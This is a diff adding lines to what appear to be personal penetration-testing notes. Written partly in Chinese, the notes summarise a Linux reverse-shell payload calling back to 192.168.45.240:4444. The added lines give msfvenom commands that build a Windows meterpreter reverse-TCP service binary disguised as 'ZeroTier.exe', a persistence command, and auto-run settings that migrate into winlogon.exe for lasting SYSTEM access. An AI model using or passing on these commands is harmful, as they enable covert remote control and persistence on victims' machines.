@@ -79,3 +79,32 @@ rm /tmp/xnrkkg
 
 🎯 一句话总结
 这条 payload 让目标 Linux 机器 主动连接 你的 192.168.45.240:4444，并通过一个命名管道实现一个稳定的反向 /bin/sh shell。
+
+use -f exe-serviec , not -f exe, will make serivce strong
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe-service -o ZeroTier.exe
+```
+
+在 Meterpreter 中执行：
+```
+run persistence -U -i 5 -p 4444 -r <你的IP>
+```
+or
+msf 
+
+```
+set InitialAutoRunScript "migrate -n explorer.exe"
+run
+```
+
+```
+set AutoRunScript "migrate -n winlogon.exe"
+
+```
+# Try to jump into winlogon (it always runs as SYSTEM and never stops)
+```
+
+run migrate -n winlogon.exe
+```
+
